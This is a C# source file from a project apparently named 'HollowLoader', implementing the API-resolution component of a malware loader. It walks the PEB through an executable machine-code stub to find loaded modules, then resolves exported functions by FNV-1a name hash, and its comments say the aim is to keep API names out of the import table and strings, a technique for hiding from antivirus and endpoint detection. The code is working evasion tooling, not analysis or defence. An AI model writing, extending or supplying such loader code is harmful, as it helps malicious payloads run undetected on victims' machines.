using System;
using System.Runtime.InteropServices;
using System.Text;

namespace HollowLoader
{
    /// <summary>
    /// Runtime API resolution:
    ///  1. TEB -> PEB -> Ldr -> InMemoryOrderModuleList (PEB walk) to obtain the
    ///     base address of a module by (obfuscated) name, with zero imports.
    ///  2. PE export directory walk to resolve a function by FNV-1a hash of its
    ///     lowercased name.
    /// This keeps API names out of the import table and the binary's strings.
    /// </summary>
    internal static class ApiResolver
    {
        private const uint PeSignature = 0x00004550; // "PE\0\0"

        internal static uint Fnv1a(string name)
        {
            uint hash = 0x811C9DC5;
            foreach (char c in name.ToLowerInvariant())
            {
                hash ^= c;
                hash *= 0x01000193;
            }
            return hash;
        }

        /// <summary>Resolve the base address of a loaded module by name (case-insensitive).</summary>
        internal static IntPtr GetModuleBase(string moduleName)
        {
            IntPtr baseAddr = GetModuleBasePebWalk(moduleName);
            if (baseAddr == IntPtr.Zero)
                baseAddr = GetModuleBaseFromProcess(moduleName);
            return baseAddr;
        }

        /// <summary>
        /// PEB walk. Bootstrap uses a tiny executable stub containing the exact
        /// machine code of NtCurrentTeb (mov reg, gs:[0x30]/fs:[0x18]; ret)
        /// instead of importing the function, which is not exported by name on
        /// every Windows build (newer Windows 11 ntdll, WoW64, ...).
        /// </summary>
        private static IntPtr GetModuleBasePebWalk(string moduleName)
        {
            // x64: 65 48 8B 04 25 30 00 00 00 C3 -> mov rax, qword ptr gs:[0x30]; ret
            // x86: 64 A1 18 00 00 00 C3          -> mov eax, dword ptr fs:[0x18]; ret
            byte[] stub = IntPtr.Size == 8
                ? new byte[] { 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0xC3 }
                : new byte[] { 0x64, 0xA1, 0x18, 0x00, 0x00, 0x00, 0xC3 };

            IntPtr mem = Native.VirtualAlloc(IntPtr.Zero, (UIntPtr)stub.Length,
                Native.MEM_COMMIT | Native.MEM_RESERVE, Native.PAGE_EXECUTE_READWRITE);
            if (mem == IntPtr.Zero) return IntPtr.Zero;

            IntPtr teb;
            try
            {
                Marshal.Copy(stub, 0, mem, stub.Length);
                teb = Marshal.GetDelegateForFunctionPointer<Native.GetTebDelegate>(mem)();
            }
            finally
            {
                Native.VirtualFree(mem, UIntPtr.Zero, Native.MEM_RELEASE);
            }
            if (teb == IntPtr.Zero) return IntPtr.Zero;

            bool is64 = IntPtr.Size == 8;

            IntPtr peb = ReadPtr(teb, is64 ? 0x60 : 0x30);
            if (peb == IntPtr.Zero) return IntPtr.Zero;

            IntPtr ldr = ReadPtr(peb, is64 ? 0x18 : 0x0C);
            if (ldr == IntPtr.Zero) return IntPtr.Zero;

            // InMemoryOrderModuleList head
            IntPtr head = IntPtr.Add(ldr, is64 ? 0x20 : 0x14);
            IntPtr current = ReadPtr(head, 0); // Flink of first entry

            int guard = 0;
            while (current != IntPtr.Zero && current != head && guard++ < 1024)
            {
                // current points at InMemoryOrderLinks; BaseDllName.Buffer:
                //   x64: entry+0x48   x86: entry+0x28   (see LDR_DATA_TABLE_ENTRY layout)
                IntPtr nameBufPtr = ReadPtr(current, is64 ? 0x48 : 0x28);
                if (nameBufPtr != IntPtr.Zero)
                {
                    string name = Marshal.PtrToStringUni(nameBufPtr);
                    if (name != null &&
                        string.Equals(name, moduleName, StringComparison.OrdinalIgnoreCase))
                    {
                        // DllBase relative to InMemoryOrderLinks: x64 +0x20, x86 +0x10
                        return ReadPtr(current, is64 ? 0x20 : 0x10);
                    }
                }
                current = ReadPtr(current, 0); // Flink
            }
            return IntPtr.Zero;
        }

        /// <summary>Resolve an exported function address by FNV-1a hash of its name.</summary>
        internal static IntPtr ResolveExport(IntPtr moduleBase, uint nameHash)
        {
            if (moduleBase == IntPtr.Zero) return IntPtr.Zero;

            uint peOffset = (uint)Marshal.ReadInt32(moduleBase, 0x3C);
            IntPtr pe = IntPtr.Add(moduleBase, (int)peOffset);
            if (Marshal.ReadInt32(pe) != (int)PeSignature) return IntPtr.Zero;

            bool is64 = IntPtr.Size == 8;
            // DataDirectory[0] (export table): PE32+ starts at opt+0x70, PE32 at opt+0x60
            IntPtr exportDir = IntPtr.Add(pe, 0x18 + (is64 ? 0x70 : 0x60));
            uint exportRva = (uint)Marshal.ReadInt32(exportDir, 0);
            if (exportRva == 0) return IntPtr.Zero;

            IntPtr exp = IntPtr.Add(moduleBase, (int)exportRva);
            int numberOfNames = Marshal.ReadInt32(exp, 0x18);
            uint addressOfFunctions = (uint)Marshal.ReadInt32(exp, 0x1C);
            uint addressOfNames = (uint)Marshal.ReadInt32(exp, 0x20);
            uint addressOfNameOrdinals = (uint)Marshal.ReadInt32(exp, 0x24);

            for (int i = 0; i < numberOfNames; i++)
            {
                uint nameRva = (uint)Marshal.ReadInt32(IntPtr.Add(moduleBase, (int)addressOfNames), i * 4);
                IntPtr namePtr = IntPtr.Add(moduleBase, (int)nameRva);
                string name = Marshal.PtrToStringAnsi(namePtr);
                if (name != null && Fnv1a(name) == nameHash)
                {
                    ushort ordinal = (ushort)Marshal.ReadInt16(IntPtr.Add(moduleBase, (int)addressOfNameOrdinals), i * 2);
                    uint funcRva = (uint)Marshal.ReadInt32(IntPtr.Add(moduleBase, (int)addressOfFunctions), ordinal * 4);
                    return IntPtr.Add(moduleBase, (int)funcRva);
                }
            }
            return IntPtr.Zero;
        }

        internal static T GetDelegate<T>(IntPtr moduleBase, uint nameHash) where T : class
        {
            IntPtr fn = ResolveExport(moduleBase, nameHash);
            if (fn == IntPtr.Zero) return null;
            return Marshal.GetDelegateForFunctionPointer<T>(fn);
        }

        /// <summary>
        /// Fallback: enumerate loaded modules through the runtime. Works even if
        /// the PEB walk is blocked or its offsets change between Windows builds.
        /// </summary>
        private static IntPtr GetModuleBaseFromProcess(string moduleName)
        {
            try
            {
                using (var process = System.Diagnostics.Process.GetCurrentProcess())
                {
                    foreach (System.Diagnostics.ProcessModule module in process.Modules)
                    {
                        if (module == null) continue;
                        string shortName = module.ModuleName;
                        string fileName = module.FileName;
                        if ((shortName != null && string.Equals(shortName, moduleName, StringComparison.OrdinalIgnoreCase)) ||
                            (fileName != null && string.Equals(System.IO.Path.GetFileName(fileName), moduleName, StringComparison.OrdinalIgnoreCase)))
                        {
                            return module.BaseAddress;
                        }
                    }
                }
            }
            catch
            {
                // enumeration failed — caller handles IntPtr.Zero
            }
            return IntPtr.Zero;
        }

        private static IntPtr ReadPtr(IntPtr baseAddr, int offset)
        {
            return Marshal.ReadIntPtr(IntPtr.Add(baseAddr, offset));
        }
    }
}
